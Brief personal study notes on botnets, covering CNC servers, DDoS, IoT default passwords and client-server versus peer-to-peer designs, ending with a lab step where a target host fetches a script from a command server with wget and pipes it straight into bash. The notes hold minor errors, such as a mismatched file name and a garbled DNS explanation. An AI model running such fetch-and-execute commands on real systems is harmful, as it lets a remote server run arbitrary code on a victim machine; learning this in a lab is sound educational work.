Botnets - several clients connect to a single CNC server. EXAMPLE ATTACKS: Distribution denial of Service (DDoS) by overwhelming a web server with traffic, causing it to be unavailable

DDOS - Overwhelming the DNS server (when using the web) it gets IP requests from the DNS and the attack can prevent users from getting traffic

IoT (Internet of Things) - Cameras and router devices using default passwords of the systems

Botnet architectures
1. Client-server architecture = single server
2. P2P architecture = any bot in the network can be the server

Creating a file that we want our bots to run:
KALI-cmd  touch command.sh                        #Creates a new file named command.sh
KALI-cmd  echo "ping 172.217.9.206" > commands.sh  #The Echo command writes that command to the file

meta-cmd  wget -O - 0.0.0.0:8080\commands.sh | bash    #0.0.0.0 was the ip of the server 8080. piped over by | through bash
